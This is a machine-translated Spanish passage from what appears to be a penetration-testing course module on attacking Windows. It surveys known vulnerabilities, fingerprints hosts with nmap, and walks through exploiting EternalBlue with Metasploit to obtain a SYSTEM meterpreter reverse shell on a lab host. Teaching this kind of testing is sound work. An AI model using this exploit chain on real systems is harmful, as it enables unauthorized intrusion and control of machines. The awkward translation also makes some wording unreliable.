# Infiltración de ventanas

Como muchos de nosotros podemos recordar, Microsoft ha dominado los mercados de hogares y empresas para la informática. En los días modernos, con la introducción de características mejoradas de Active Directory, más interconectividad con los servicios en la nube, el subsistema de Windows para Linux y mucho más, la superficie de ataque de Microsoft también ha crecido.

Por ejemplo, solo en los últimos cinco años, ha habido`3688`Las vulnerabilidades informadas justo dentro de los productos de Microsoft, y este número crece diariamente. Esta tabla se derivó de[AQUÍ](https://www.cvedetails.com/vendor/26/Microsoft.html)

---

### **Tabla de vulnerabilidad de Windows**

![](https://academy.hackthebox.com/storage/modules/115/window-vulns-table.png)

# **Expertos de ventanas prominentes**

En los últimos años, varias vulnerabilidades en el sistema operativo de Windows y sus ataques correspondientes son algunas de las vulnerabilidades más explotadas de nuestro tiempo. Discutamos los que por un minuto:

| **Vulnerabilidad** | **Descripción** |
| --- | --- |
| `MS08-067` | MS08-067 fue un parche crítico empujado a muchas revisiones diferentes de Windows debido a un defecto de SMB. Esta falla hizo que fuera extremadamente fácil infiltrarse en un host de Windows. Era tan eficiente que el gusano Conficker lo estaba usando para infectar a cada anfitrión vulnerable que encontró. Incluso Stuxnet aprovechó esta vulnerabilidad. |
| `Eternal Blue` | MS17-010 es una exploit filtrada en el volcado de los corredores de sombra de la NSA. Esta exploit se usó notablemente en el ransomware WannaCry y los ataques cibernéticos nopetya. Este ataque aprovechó un defecto en el protocolo SMB V1 que permite la ejecución del código. Se cree que EternalBlue ha infectado a más de 200,000 anfitriones solo en 2017 y sigue siendo una forma común de encontrar acceso a un host vulnerable de Windows. |
| `PrintNightmare` | Una vulnerabilidad de ejecución de código remoto en el boteador de impresión de Windows. Con credenciales válidas para ese host o un shell de bajo privilegio, puede instalar una impresora, agregar un controlador que se ejecute para usted y le otorga acceso a nivel de sistema al host. Esta vulnerabilidad ha sido devastador de empresas hasta 2021. 0xdf escribió una publicación increíble al respecto[aquí](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html). |
| `BlueKeep` | CVE 2019-0708 es una vulnerabilidad en el protocolo RDP de Microsoft que permite la ejecución de código remoto. Esta vulnerabilidad aprovechó un canal de fallas para obtener la ejecución del código, afectando cada revisión de Windows de Windows 2000 a Server 2008 R2. |
| `Sigred` | CVE 2020-1350 utilizó una falla en cómo DNS lee los registros de recursos SIG. Es un poco más complicado que las otras exploits en esta lista, pero si se hace correctamente, le dará al atacante privilegios de administrador del dominio ya que afectará el servidor DNS del dominio, que comúnmente es el controlador de dominio principal. |
| `SeriousSam` | CVE 2021-36934 explota un problema con la forma en que Windows maneja el permiso en el`C:\Windows\system32\config`carpeta. Antes de solucionar el problema, los usuarios no elevados tienen acceso a la base de datos SAM, entre otros archivos. Este no es un gran problema ya que no se puede acceder a los archivos mientras la PC usa, pero esto se vuelve peligroso cuando se mira volumen de copias de seguridad de copias de sombra. Estos mismos errores de privilegio también existen en los archivos de copia de seguridad, lo que permite que un atacante lea la base de datos SAM, dumping Credenciales. |
| `Zerologon` | CVE 2020-1472 es una vulnerabilidad crítica que explota un defecto criptográfico en el Protocolo remoto de NetLogon (MS-NRPC) de Microsoft. Permite a los usuarios iniciar sesión en servidores utilizando NT LAN Manager (NTLM) e incluso enviar cambios de cuenta a través del protocolo. El ataque puede ser un poco complejo, pero es trivial de ejecutar ya que un atacante tendría que hacer alrededor de 256 conjeturas en una contraseña de cuenta de la computadora antes de encontrar lo que necesita. Esto puede suceder en cuestión de unos segundos. |

Con estas vulnerabilidades en mente, Windows no irá a ninguna parte. Necesitamos ser competentes para identificar vulnerabilidades, explotarlas y movernos en hosts y entornos de Windows. La comprensión de estos conceptos también puede ayudarnos a asegurar nuestros entornos del ataque. Ahora es el momento de bucear y explorar algunas diversiones de exploit centradas en Windows.

---

# **Enumerando a Windows y métodos de huellas dactilares**

Este módulo supone que ya ha realizado su fase de enumeración de host y comprende qué servicios se ven comúnmente en los hosts. Solo estamos tratando de darle algunos trucos rápidos para determinar si un host es probablemente una máquina de Windows. Mira el[Enumeración de red con NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap)Módulo para una mirada más detallada a la enumeración del host y las huellas dactilares.

Dado que tenemos un conjunto de objetivos,`what are a few ways to determine if the host is likely a Windows Machine`? Para responder a esta pregunta, podemos mirar algunas cosas. El primero es el`Time To Live`(TTL) Contador al utilizar ICMP para determinar si el host está activo. Una respuesta típica de un host de Windows será de 32 o 128. Una respuesta de o alrededor de 128 es la respuesta más común que verá. Es posible que este valor no siempre sea exacto, especialmente si no está en la misma red de la misma capa que el objetivo. Podemos utilizar este valor ya que la mayoría de los anfitriones nunca estarán a más de 20 saltos de su punto de origen, por lo que hay pocas posibilidades de que el contador TTL caiga en los valores aceptables de otro tipo de sistema operativo. En la salida de ping`below`, podemos ver un ejemplo de esto. Para el ejemplo, hicimos un host de Windows 10 y podemos ver que hemos recibido respuestas con un TTL de 128. Echa un vistazo a esto[enlace](https://subinsb.com/default-device-ttl-values/)Para una buena tabla que muestra otros valores TTL por OS.

### **Anfitrión**

Infiltración de ventanas

```
xnoxos@htb[/htb]$ ping 192.168.86.39 PING 192.168.86.39 (192.168.86.39): 56 data bytes
64 bytes from 192.168.86.39: icmp_seq=0 ttl=128 time=102.920 ms
64 bytes from 192.168.86.39: icmp_seq=1 ttl=128 time=9.164 ms
64 bytes from 192.168.86.39: icmp_seq=2 ttl=128 time=14.223 ms
64 bytes from 192.168.86.39: icmp_seq=3 ttl=128 time=11.265 ms

```

Otra forma en que podemos validar si el host es Windows o no es usar nuestra herramienta práctica,`NMAP`. NMAP tiene una capacidad genial integrada para ayudar con la identificación del sistema operativo y muchos otros escaneos con guiones para verificar cualquier cosa, desde una vulnerabilidad específica hasta la información recopilada de SNMP. Para este ejemplo, utilizaremos el`-O`Opción con salida detallada`-v`Para inicializar una exploración de identificación del sistema operativo contra nuestro objetivo`192.168.86.39`. A medida que desplazamos a través de la sesión de shell a continuación y miramos los resultados, algunas cosas lo regalan como un host de Windows. Nos centraremos en los que aquí en un minuto. Mire cuidadosamente la parte inferior de la sesión de concha. Podemos ver el punto etiquetado`OS CPE: cpe:/o:microsoft:windows_10`y`OS details: Microsoft Windows 10 1709 - 1909`. NMAP hizo esta suposición basada en varias métricas diferentes que deriva de la pila TCP/IP. Utiliza esas cualidades para determinar el sistema operativo, ya que lo verifica en una base de datos de huellas digitales del sistema operativo. En este caso, NMAP ha determinado que nuestro host es una máquina de Windows 10 con un nivel de revisión entre 1709 y 1909.

Si te encuentras con problemas y los escaneos presentan pequeños resultados, intente nuevamente con el`-A`y`-Pn`opciones. Esto realizará un escaneo diferente y puede funcionar. Para obtener más información sobre cómo funciona este proceso, consulte este artículo del[Documentación de NMAP](https://nmap.org/book/man-os-detection.html). Tenga cuidado con este método de detección. Implementar un firewall u otras características de seguridad puede oscurecer el host o arruinar los resultados. Cuando sea posible, use más de un cheque para tomar una determinación.

### **Exploración de detección del sistema operativo**

Infiltración de ventanas

```
xnoxos@htb[/htb]$ sudo nmap -v -O 192.168.86.39Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT
Initiating ARP Ping Scan at 17:40
Scanning 192.168.86.39 [1 port]
Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:40
Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed
Initiating SYN Stealth Scan at 17:40
Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports]
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports)
Initiating OS detection (try#1) against desktop-jba7h4t.lan (192.168.86.39)Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.010s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
912/tcp open  apex-mesh
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 1909
Network Distance: 1 hop

```

Ahora que sabemos que estamos tratando con un host de Windows 10, debemos enumerar los servicios que podemos ver para determinar si tenemos una posible vía de explotación. Para realizar la toma de pancartas, podemos usar varias herramientas diferentes. NetCat, NMAP y muchos otros pueden realizar la enumeración que necesitamos, pero para este caso, veremos un script NMAP simple llamado`banner.nse`. Para cada puerto que NMAP ve como Up, intentará conectarse al puerto y obtener cualquier información que pueda. En la sesión a continuación, NMAP intentó conectarse a cada puerto, pero los únicos puertos para devolver una respuesta fueron los puertos 902 y 912. Según el banner de página, tienen algo que ver con la estación de trabajo VMware. Podemos intentar encontrar una exploit que se ocupe de ese protocolo, o podemos enumerar aún más los otros puertos. En un verdadero pentest, querrás ser lo más minucioso posible, asegurándote de tener el laico completo de la tierra.

### **Banner Grab para enumerar los puertos**

Infiltración de ventanas

```
xnoxos@htb[/htb]$ sudo nmap -v 192.168.86.39 --script banner.nseStarting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT
NSE: Loaded 1 scripts for scanning.
<snip>
Discovered open port 135/tcp on 192.168.86.39
Discovered open port 139/tcp on 192.168.86.39
Discovered open port 445/tcp on 192.168.86.39
Discovered open port 443/tcp on 192.168.86.39
Discovered open port 912/tcp on 192.168.86.39
Discovered open port 902/tcp on 192.168.86.39
Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports)
NSE: Script scanning 192.168.86.39.
Initiating NSE at 18:01
Completed NSE at 18:01, 20.11s elapsed
Nmap scan report for desktop-jba7h4t.lan (192.168.86.39)
Host is up (0.012s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds
902/tcp open  iss-realsecure
| banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se
|_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t
912/tcp open  apex-mesh
| banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto
|_col:SOAP, MKSDisplayProtocol:VNC , ,
MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate)

```

Los ejemplos que se muestran anteriormente son solo algunas maneras de ayudar a la huella digital y determinar si un host es una máquina de Windows. De ninguna manera es una lista exhaustiva, y hay muchos otros cheques que puede hacer. Ahora que hemos discutido las huellas dactilares, veamos varios tipos de archivos y para qué pueden usarse al construir la carga útil.

---

# **Bats, Dlls y archivos MSI, ¡Oh, Dios mío!**

Cuando se trata de crear cargas útiles para hosts de Windows, tenemos muchas opciones para elegir. Los DLL, los archivos por lotes, los paquetes MSI e incluso los scripts de PowerShell son algunos de los métodos más comunes para usar. Cada tipo de archivo puede lograr cosas diferentes para nosotros, pero lo que todos tienen en común es que son ejecutables en un host. Intente tener en cuenta su mecanismo de entrega para la carga útil, ya que esto puede determinar qué tipo de carga útil usa.

### **Tipos de carga útil a considerar**

- [Dlls](https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)Una biblioteca de enlace dinámico (DLL) es un archivo de biblioteca utilizado en los sistemas operativos de Microsoft para proporcionar código compartido y datos que pueden ser utilizados por muchos programas diferentes a la vez. Estos archivos son modulares y nos permiten tener aplicaciones que sean más dinámicas y más fáciles de actualizar. Como Pentester, inyectar una DLL maliciosa o secuestrar una biblioteca vulnerable en el host puede elevar nuestros privilegios al sistema y/o pasar por alto los controles de la cuenta del usuario.
- [Lote](https://commandwindows.com/batch.htm)Los archivos por lotes son scripts DOS basados en texto utilizados por los administradores del sistema para completar múltiples tareas a través del intérprete de línea de comandos. Estos archivos terminan con una extensión de`.bat`. Podemos usar archivos por lotes para ejecutar comandos en el host de manera automatizada. Por ejemplo, podemos hacer que un archivo por lotes abra un puerto en el host o conectarnos nuevamente a nuestro cuadro de ataque. Una vez hecho esto, puede realizar pasos de enumeración básicos y alimentarnos con información sobre el puerto abierto.
- [VBS](https://www.guru99.com/introduction-to-vbscript.html)VBScript es un lenguaje de secuencias de comandos ligero basado en Visual Basic de Microsoft. Por lo general, se usa como un lenguaje de secuencias de comandos del lado del cliente en los servidores web para habilitar páginas web dinámicas. VBS está fechado y discapacitado por la mayoría de los navegadores web modernos, pero vive en el contexto del phishing y otros ataques destinados a hacer que los usuarios realicen una acción, como habilitar la carga de macros en un documento de Excel o hacer clic en una celda para que el motor de secuencias de comandos de Windows ejecute una pieza de código.
- [MSI](https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions) `.MSI`Los archivos sirven como una base de datos de instalación para el instalador de Windows. Al intentar instalar una nueva aplicación, el instalador buscará el archivo .msi para comprender todos los componentes requeridos y cómo encontrarlos. Podemos usar el instalador de Windows elaborando una carga útil como un archivo .msi. Una vez que lo tenemos en el anfitrión, podemos ejecutar`msiexec`Para ejecutar nuestro archivo, que nos proporcionará un mayor acceso, como un shell inverso elevado.
- [Powershell](https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1)PowerShell es tanto un entorno de conchas como un lenguaje de secuencias de comandos. Sirve como el moderno entorno de Shell de Microsoft en sus sistemas operativos. Como lenguaje de secuencias de comandos, es un lenguaje dinámico basado en el tiempo de ejecución del lenguaje común .NET que, como su componente de shell, toma entrada y salida como objetos .NET. PowerShell puede proporcionarnos una gran cantidad de opciones cuando se trata de obtener un caparazón y ejecución en un host, entre muchos otros pasos en nuestro proceso de prueba de penetración.

Ahora que entendemos qué se puede usar cada tipo de archivo de Windows para discutir algunas herramientas básicas, tácticas y procedimientos para construir nuestras cargas útiles y entregarlas al host para aterrizar un shell.

---

# **Herramientas, tácticas y procedimientos para la generación de carga útil, transferencia y ejecución**

A continuación encontrará ejemplos de diferentes métodos de generación de carga útil y formas de transferir nuestras cargas útiles a la víctima. Hablaremos sobre algunos de estos métodos en un alto nivel, ya que nuestro enfoque está en la generación de carga útil y en las diferentes formas de adquirir un shell en el objetivo.

### **Generación de carga útil**

Tenemos muchas buenas opciones para lidiar con la generación de cargas útiles para usar contra los hosts de Windows. Tocamos algunos de estos ya en secciones anteriores. Por ejemplo, el MetaSploit-Framework y MSFVENOM es una forma muy útil de generar cargas útiles, ya que es el sistema operativo. La siguiente tabla establece algunas de nuestras opciones. Sin embargo, esta no es una lista exhaustiva, y los nuevos recursos salen a diario.

| **Recurso** | **Descripción** |
| --- | --- |
| `MSFVenom & Metasploit-Framework` | [Fuente](https://github.com/rapid7/metasploit-framework)MSF es una herramienta extremadamente versátil para cualquier kit de herramientas de Pentester. Sirve como una forma de enumerar los hosts, generar cargas útiles, utilizar exploits públicos y personalizados y realizar acciones posteriores a la explotación una vez en el host. Piense en ello como un cuchillo de ejército suizo. |
| `Payloads All The Things` | [Fuente](https://github.com/swisskyrepo/PayloadsAllTheThings)Aquí, puede encontrar muchos recursos y hojas de trampa diferentes para la generación de carga útil y la metodología general. |
| `Mythic C2 Framework` | [Fuente](https://github.com/its-a-feature/Mythic)El marco mítico C2 es una opción alternativa para metasplroit como un marco de comando y control y caja de herramientas para una generación única de carga útil. |
| `Nishang` | [Fuente](https://github.com/samratashok/nishang)Nishang es una colección marco de implantes y guiones de PowerShell ofensivo. Incluye muchas utilidades que pueden ser útiles para cualquier Pentester. |
| `Darkarmour` | [Fuente](https://github.com/bats3c/darkarmour)Darkarmour es una herramienta para generar y utilizar binarios ofuscados para su uso contra hosts de Windows. |

### **Transferencia y ejecución de la carga útil:**

Además de los vectores de Web-Drive-by, Phishing Sorreoss o Dead Drops, los hosts de Windows pueden proporcionarnos varias otras vías de entrega de carga útil. La siguiente lista incluye algunas herramientas y protocolos útiles para su uso mientras intenta soltar una carga útil en un objetivo.

- `Impacket`: [Embalsar](https://github.com/SecureAuthCorp/impacket)es una pitón incorporada en el conjunto de herramientas que nos proporciona una forma de interactuar directamente con los protocolos de red. Algunas de las herramientas más emocionantes que nos importan en el trato de Impacket`psexec`, `smbclient`, `wmi`, Kerberos, y la capacidad de soportar un servidor SMB.
- [Cargas útiles todas las cosas](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute.md): Es un gran recurso para encontrar onelinistas rápidos para ayudar a transferir archivos a través de los hosts de manera expedente.
- `SMB`: SMB puede proporcionar una ruta fácil de explotar para transferir archivos entre hosts. Esto puede ser especialmente útil cuando los anfitriones de las víctimas están unidos por el dominio y utilizan acciones para el anfitrión de los datos. Nosotros, como atacantes, podemos usar estas acciones de archivos SMB junto con C $ y Admin $ para alojar y transferir nuestras cargas útiles e incluso exfiltrar datos a través de los enlaces.
- `Remote execution via MSF`: Instruido en muchos de los módulos de exploit en MetaSploit es una función que construirá, organizará y ejecutará las cargas útiles automáticamente.
- `Other Protocols`: Al mirar un host, protocolos como FTP, TFTP, HTTP/S y más pueden proporcionarle una forma de cargar archivos al host. Enumere y preste atención a las funciones abiertas y disponibles para su uso.

Ahora que sabemos qué herramientas, tácticas y procedimientos podemos usar para transferir nuestras cargas útiles, verifiquemos un proceso de compromiso de ejemplo.

---

# **Ejemplo de compromiso Tutorial**

1. Enumerar al anfitrión

Ping, Netcat, NMAP escaneos e incluso MetaSploit son buenas opciones para comenzar a enumerar a nuestras posibles víctimas. Para comenzar esta vez, utilizaremos un escaneo NMAP. La porción de enumeración de cualquier cadena de explotación es posiblemente la pieza más crítica del rompecabezas. Comprender el objetivo y lo que lo hace funcionar aumentará sus posibilidades de obtener un caparazón.

### **Enumerar al anfitrión**

Infiltración de ventanas

```
xnoxos@htb[/htb]$ nmap -v -A 10.129.201.97Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.

Discovered open port 135/tcp on 10.129.201.97
Discovered open port 80/tcp on 10.129.201.97
Discovered open port 445/tcp on 10.129.201.97
Discovered open port 139/tcp on 10.129.201.97
Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports)
Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host)
NSE: Script scanning 10.129.201.97.
Nmap scan report for 10.129.201.97
Host is up (0.13s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 10.129.201.97 - /
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: SHELLS-WINBLUE
|   NetBIOS computer name: SHELLS-WINBLUE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

```

Descubrimos algunas cosas durante el escaneo y la validación del host de ejemplo en cuestión. Se está ejecutando`Windows Server 2016 Standard 6.3`. Tenemos el nombre de host ahora, y sabemos que no está en un dominio y está ejecutando varios servicios. Ahora que hemos reunido alguna información, determinemos nuestra posible ruta de exploit.

`IIS`Podría ser una ruta potencial, intentando acceder al host sobre SMB utilizando una herramienta como Impacket o autenticando si tuviéramos credenciales pudiera hacerlo, y desde una perspectiva del sistema operativo, también puede haber una ruta para una RCE. Se sabe que MS17-010 (EternalBlue) afecta a los anfitriones que van desde Windows 2008 hasta Server 2016. Con esto en mente, podría ser una apuesta sólida que nuestra víctima sea vulnerable desde que cae en esa ventana. Validemos que el uso de una verificación auxiliar de Builtin desde`Metasploit`, `auxiliary/scanner/smb/smb_ms17_010`.

1. Buscar y decidir en una ruta de exploit

Abierto`msfconsole`y busque EternalBlue, o puede usar la cadena en la sesión a continuación para usar el cheque. Establezca el campo RHOSTS con la dirección IP del objetivo e inicie el escaneo. Como se puede ver en las opciones para el módulo, puede completar más configuraciones de SMB, pero no es necesario. Ayudarán a que el cheque sea más probable que tenga éxito. Cuando esté listo, escriba`run`.

### **Determinar una ruta de exploit**

Infiltración de ventanas

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                 Required  Description
   ----         ---------------                 --------  -----------
   CHECK_ARCH   true                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framewor  yes       List of named pipes to check
                k/data/wordlists/named_pipes.t
                xt
   RHOSTS                                       yes       The target host(s), range CIDR identifier, or hosts f
                                                          ile with syntax 'file:<path>'
   RPORT        445                             yes       The SMB service port (TCP)
   SMBDomain    .                               no        The Windows domain to use for authentication
   SMBPass                                      no        The password for the specified username
   SMBUser                                      no        The username to authenticate as
   THREADS      1                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.129.201.97

RHOSTS => 10.129.201.97
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.201.97:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 10.129.201.97:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Ahora, podemos ver en los resultados de la verificación que nuestro objetivo es probable que sea vulnerable a EternalBlue. Establezcamos el exploit y la carga útil ahora, luego pruébele.

1. Seleccione Exploit y carga útil, luego entregue

### **Elija y configure nuestra exploit y carga útil**

Infiltración de ventanas

```
msf6 > search eternal

Matching Modules
================

#  Name                                           Disclosure Date  Rank     Check  Description   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

Para este caso, cavamos a través de los módulos de exploit de MSF utilizando la función de búsqueda para buscar un exploit que coincida con EternalBlue. La lista anterior fue el resultado. Ya que he tenido más suerte con el`psexec`Versión de este exploit, intentaremos eso primero. Vamos a elegirlo y continuar la configuración.

### **Configurar el exploit y la carga útil**

Infiltración de ventanas

```
msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share                                                                (ADMIN$,C$,...) or a normal read/write folder s                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

```

Asegúrese de establecer sus opciones de carga útil correctamente antes de ejecutar el exploit. Cualquier opción que tenga`Required`establecido en sí será un espacio necesario para llenar. En este caso, debemos asegurarnos de que nuestro`RHOSTS, LHOST, and LPORT`Los campos están configurados correctamente. Para este intento, aceptar los valores predeterminados para el resto está bien.

### **Validar nuestras opciones**

Infiltración de ventanas

```
msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share                                                                (ADMIN$,C$,...) or a normal read/write folder s                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

```

Esta vez, lo mantuvimos simple y solo usamos un`windows/meterpreter/reverse_tcp`carga útil. Puede cambiar esto como desee para un tipo de shell diferente u ofuscar más su ataque, como se muestra en las secciones de carga útil anterior. Con nuestras opciones establecidas, intentemos esto y veamos si aterrizamos un caparazón.

1. Ejecutar el ataque y recibir una devolución de llamada.

### **Ejecutar nuestro ataque**

Infiltración de ventanas

```
msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter >

```

¡Éxito! Hemos aterrizado nuestra exploit y ganamos una sesión de conchas. A`SYSTEM`Nivel de caparazón en eso. Como se ve en los módulos MSF anteriores, ahora que tenemos una sesión abierta a través de Meterpreter, se nos presenta el`meterpreter >` inmediato. A partir de aquí, podemos utilizar Meterpreter para ejecutar más comandos para recopilar información del sistema, robar credenciales de los usuarios o usar otro módulo de explotación posterior al host. Si desea interactuar directamente con el host, también puede caer en una sesión de shell interactiva en el host desde meterpreter.

1. Identificar el caparazón nativo.

### **Identifica nuestro caparazón**

Infiltración de ventanas

```
meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

```

Cuando ejecutamos el comando meterpreter`shell`, comenzó otro proceso en el host y nos dejó en un shell del sistema. ¿Puedes determinar en qué estamos del mensaje? Solo viendo`C:\Windows\system32>`puede darnos cuenta en que solo estamos en un`cmd.exe shell`. Para asegurarse, simplemente ejecutar la ayuda de comando desde el shell también le hará saber. Si nos dejaran caer en PowerShell, nuestro aviso se vería como`PS C:\Windows\system32>`. La PS al frente nos hace saber que es una sesión de PowerShell. Felicidades por caer en un shell en nuestro último host de Windows explotado.

Ahora que hemos pasado a través de un proceso de compromiso de muestra, examinemos los proyectiles que puede ver cuando aterriza en el anfitrión.

---

# **CMD-ProMPT y POWER [shell] S por diversión y ganancias.**

Somos afortunados de que los hosts de Windows no tengan una sino dos opciones para que los shells utilicen de forma predeterminada. Ahora puede que se pregunte:

`Which one is the right one to use?`

